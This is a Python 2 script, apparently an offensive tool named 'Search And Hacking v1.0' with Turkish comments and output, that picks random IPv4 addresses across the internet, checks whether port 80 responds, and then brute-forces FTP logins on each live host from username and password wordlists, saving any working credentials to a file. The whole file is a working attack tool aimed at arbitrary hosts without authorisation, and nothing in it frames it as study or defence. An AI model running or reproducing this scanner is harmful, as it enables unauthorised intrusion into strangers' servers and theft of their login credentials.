# -*- coding: cp1254 -*-
#BEDIR ZANA DEMIR
#29.05.2017

import socket
from random import randrange
import ftplib

not_oku = []
with open("not_found.txt") as f:
   for satir in f:
      final = str(satir.replace("\n",""))
      not_oku.append(final)
      
def GenerateIP():
   while True:
      ip0 = randrange(0,256)
      ip1 = randrange(0,256)
      ip2 = randrange(0,256)
      ip3 = randrange(0,256)
      target = str(ip0)+"."+str(ip1)+"."+str(ip2)+"."+str(ip3)
      bak = not_oku.count(target)
      if bak == 0:
         return target
         break

print """
+++++++++++++++++++++++++++++++++++++++++++++++++
+            Search And Hacking v1.0            +
+               Bedir Zana Demir                +
+         github: http://goo.gl/RWkbdP          +
+++++++++++++++++++++++++++++++++++++++++++++++++
"""

print "Zaman asimi suresi girin. Bos girerseniz default deger atanacak."
time = raw_input(":> ")
print "-------------------------"
if time != "":
   times = int(time)
   print "[INF] Zaman asimi " + str(times) + " saniye olarak ayarlandi"
else:
   print "[INF] Zaman asimi default olarak ayarlandi"

print "[INF] Username ve Password wordlistleri yukleniyor"

user_oku = []
with open("user.txt") as f:
   for satir in f:
      final = str(satir.replace("\n",""))
      user_oku.append(final)

pass_oku = []
with open("pass.txt") as f:
   for satir in f:
      final = str(satir.replace("\n",""))
      pass_oku.append(final)
		
print "[INF] Tarama Baslatiliyor.."
print ""

while True:
   try:
      s=socket.socket()
      if time != "":
         s.settimeout(times)
         
      target = GenerateIP()
      s.connect((target, 80))
      print "[+] Aktif --> "+target
      s.close()
      print ""
      print "[INF] " + target + " adresi aktif. BruteForce deneniyor.."
      print ""
      durum = 0
      for my_user in user_oku:
         for my_pass in pass_oku:
            try:
               baglanti = ftplib.FTP(target)
               baglanti.login(my_user,my_pass)
               print ""
               found = " [FOUND] IP: %s username: %s password: %s" %(target, my_user, my_pass)
               print ""
               print "[INF] Bulundu! found.txt'ye kaydedildi"
               print ""
               print found
               f = open("found.txt", 'a')
               f.write(found + "\n")
               f.close
               baglanti.quit()
               durum = 2
               break
            except:
               durum = 1
               baglanti.quit()
               print " [BF] Olmadi -> username: %s password: %s" %(my_user, my_pass)
               
         if durum == 2:
            print ""
            print "[INF] Taramaya Devam Ediliyor.."
            print ""
            break
         
      if durum == 1:
         print ""
         print "[INF] %s FTP BruteForce basarisiz oldu" %(target)
         print "[INF] Taramaya Devam Ediliyor.."
         print ""
         
   except:
      print "[-] Aktif Degil --> "+target
      fa = open("not_found.txt", 'a')
      starget = target + "\n"
      fa.write(starget)
      pass

